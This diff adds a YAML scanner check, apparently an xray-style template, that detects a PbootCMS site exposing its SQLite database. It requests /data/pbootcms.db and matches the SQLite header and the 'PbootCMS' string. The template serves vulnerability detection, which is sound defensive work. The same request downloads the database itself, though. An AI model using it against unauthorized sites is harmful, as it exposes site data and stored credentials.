@@ -1,0 +1,15 @@
+id: pbootcms-database-file-download
+
+info:
+    name: Pbootcms Database File Download
+    author: abcRosexyz(https://github.com/abcRosexyz)
+    severity: high
+
+rules:
+    r0:
+        request:
+            method: GET
+            path: /data/pbootcms.db
+        expression: response.status == 200 && "^SQLite format 3\\x00\\x10".bmatches(response.body) && response.body.bcontains(b"PbootCMS")
+expression: r0()
+
